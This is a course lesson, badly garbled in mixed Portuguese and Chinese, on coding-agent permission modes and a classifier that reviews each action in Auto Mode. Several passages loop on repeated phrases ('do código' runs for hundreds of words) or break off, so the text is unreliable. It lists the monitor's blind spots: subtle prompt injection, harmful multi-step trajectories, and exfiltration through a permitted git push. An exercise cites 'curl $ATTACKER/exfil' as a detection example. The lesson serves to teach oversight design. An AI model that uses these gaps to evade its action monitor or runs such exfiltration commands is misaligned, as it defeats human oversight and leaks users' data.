# Modelo de Autonomia do Agente

> 权限阶梯从动作逐步审查到批准一切的分级自主程度是利用 管控自主代理 无需询问就能做的方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能执行方式. 无需询问的模式. 无需询问的模式.`auto` O modelo de poder  utiliza um modelo de classificador independente  substituir por um movimento de aprovação: ele reúne o movimento em cada movimento, e impede qualquer aumento que exceda o alcance da solicitação `max_turns`和 `max_budget_usd`强制执行――`auto`Se a utilização é ou não dependente do plano, da organização ou não, do modelo e do fornecedor, antropico, já foi definido, o classificador, o uso individual não é suficiente.

**类型：**- aprendizagem
**语言：**Python(stdlib, dois estágios de classificador simulador)
**先修要求：**Fase 15 · 01(Agentes de longo horizonte),Fase 15 · 09(Agente de codificação)
**时间：**Cerca de 45 minutos

## 问题

O agente de codificação autônoma em seu computador é uma categoria de segurança independente. O ataque é o agente capaz de acessar tudo o que é um sistema de arquivos, rede, credenciais, clipboard, qualquer guia de navegador, qualquer terminal aberto. Bruce Schneier, etc. já publicamente observou que os agentes de uso de computadores não são uma nova função de chatbots, mas uma nova ferramenta, com uma nova espécie de imagem.

O sistema de direitos do código Claude é um sistema de controle que é dado por Antropic. Não é um sistema autónomo, mas sim uma capacidade de criar seis modelos: plano → padrão → aceitarEdits → ... → bypassPermissões. Cada modelo é feito entre a velocidade e a análise de cada movimento.

O problema do engenharia é: o sistema consegue capturar o que vai perder, e qual modelo deve ser usado para uma determinada tarefa?

## 概念

### 六种权限模式

| 模式 | 行为 | 使用场景 |
|---|---|---|
| `plan` | Agent 提出计划；用户批准整个计划；每个动作在执行前都会被审查 | 不熟悉的任务；接近 prod 的代码；第一次在某个 repo 上使用 agent |
| `default` | 在 UI 中标为 “Manual”。Agent 运行动作；对任何“有风险”的动作提示用户（shell exec、destructive operations、network calls） | 大多数交互式 coding sessions |
| `acceptEdits` | 文件写入自动批准；shell exec 和 network calls 仍然提示 | 跨很多文件的 refactoring pass |
| `auto` | 由一个独立的 classifier model 在每个动作运行前审阅它；阻止任何超出请求范围的升级 | 受限 workspace 中的 long-horizon unattended runs |
| `dontAsk` | 从不提示；未被 permission rules 预先批准的动作一律拒绝 | 临时 sandboxes、CI jobs、research scripts |
| `bypassPermissions` | 批准一切 | 文档说明为“只在你愿意丢弃的 ephemeral containers 内使用” |

(Nome acima e código aberto do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do código do`default`标为 Manual。)

### Uma página compreender Modo Automático

Auto Mode ([[2026]] 3 月 24 日发布) é a primeira forma de dar autorização a um modelo.

1. **一个独立的 classifier model。**Em cada proposta de movimento antes de executar, revisá-lo, de acordo com a declaração de tarefa e sessão, o estado atual para julgar, e impedir qualquer aumento acima do alcance da solicitação.
2. **受限的可用性。**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             `auto` depende do plano 、 organização ou não 、 modelo e fornecedor 、

 orçamento control e classificador não existem:

- `max_turns` Uma sessão  Número de vezes em uma sessão 
- `max_budget_usd` 触发 sessão 中止的美元上限──
- Cada ferramenta de movimento número de vezes limitação , por exemplo não exceder N vezes`WebFetch`chamadas)

### O sistema pode capturar o que

- Início de ferramentas Injeção imediata direta, entre as quais injectar instruções de mapeamento para forma de movimento de risco conhecido.
- 重复 ferramenta loopsclassifier pode ver a ação N+1 com a ação N 连续五次几乎相同──
- Na sessão de edição de documentos, os comandos shell são claramente superiores aos limites.

### O sistema pode perder alguma coisa.

- **微妙的 prompt injection**O sistema de correção de dados é um sistema de correção de dados, que pode ser usado para controlar os dados, mas não pode produzir um único movimento de marcas.
- **语义层面的不当行为。**Cada movimento individual parece ser seguro, mas a trajetória do conjunto é prejudicial.
- **通过合法渠道 exfiltration。**Escrever os dados nos documentos que você tem, e depois`git push`Para o repo público, é uma série de movimentos permitidos, mas o problema está na composição deles.

### Previsão de pesquisa 定位

Antropic 将 Auto Mode 作为研究预览发布.文档明确说明,classifier is a layer防护, not a complete solution: user should use Auto Mode with budgets、allowists、isolated workspaces 和 trajectory audits.

### Esta escada está na sua posição no fluxo de trabalho.

- tarefas desconhecidas:`plan`Começar... ler o plano é mais barato do que voltar a andar mal.
- 已知 refactor:`acceptEdits`- Não, não.
- execução de fundo não supervisionada: apenas quando já tiveres medido o raio da explosão`auto`Não há credenciais, não há montos de produção, não há saída de seleção de produção.
- Containers efemerais: quando e apenas quando contêineres e suas credenciais são descartáveis,`dontAsk`- Não .`bypassPermissions`Não posso aceitar.

```figure
autonomy-oversight
```

## Use-o

`code/main.py`Colocar um classificador de revisão de ação 模拟成两阶段管道 é uma simplificação do ensino; real `auto`O modelo atrás é um modelo de classificador independente, e não um dos dois estágios de acordo com o documento. A primeira etapa é a regra de palavras-chave baratas de movimentos propostos; a segunda etapa é um revisor de regra múltipla mais lento.

## Entrega-o

`outputs/skill-permission-mode-picker.md`A descrição das tarefas será adaptada ao modelo de limitação de poder, ao limite orçamental e à separação necessária.

## 练习

1. 运行 `code/main.py` Que tipo de ação sintética não é marcada pela fase 1 mas é capturada pela fase 2?

2. 扩展 Fase 1 conjunto de regras, para capturar uma determinada forma conhecida-mau, por exemplo`curl $ATTACKER/exfil`)── em amostra de ação benigna 上测量 false-positive rate──

3. 阅读 Anthropic's "Como funciona o ciclo do agente" 文档――列出 agent 在 `default`模式下默认触碰的每种外部状态──在无监督运行  运行   运行   运行 `auto`Antes, que precisa de um portão?

4. 设计一个 24 小时 无监督运行预算:`max_turns`- Não.`max_budget_usd`、per-tool caps、allowlists──说明每个数字的理由──

5. Descrever uma trajetória: cada um deles é classificado, mas o comportamento de montagem é desalinhado.

## 关键术语

| 术语 | 人们常说 | 实际含义 |
|---|---|---|
| 权限模式 | “agent 能做多少事” | 控制逐动作批准的六种命名 policy 之一 |
| plan mode | “做任何事前都询问” | Agent 编写计划；用户在执行前批准 |
| acceptEdits | “让它写文件” | 文件写入自动批准；shell exec 仍然提示 |
| auto | “Auto approvals” | 独立的 classifier model 审阅每个动作；阻止超出请求范围的升级 |
| bypassPermissions | “Full YOLO” | 批准一切；预期用于 ephemeral containers |
| Stage 1（simulator） | “Fast keyword check” | `code/main.py` 中针对拟议动作的廉价 rule |
| Stage 2（simulator） | “Deep review” | `code/main.py` 中针对被标记动作的更慢 multi-rule reviewer |
| Research preview | “Not GA” | Anthropic 对 failure mode 仍在被映射的功能所使用的定位 |

## 延伸阅读

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) 权限模式、预算、行动形式──
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) serviço gerenciado 执行模型。
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) superfície de recurso e anúncio de modo automático.
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) 塑造 classificador 判断的理性基层──
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) 关于 长视界许可设计的内部视角──
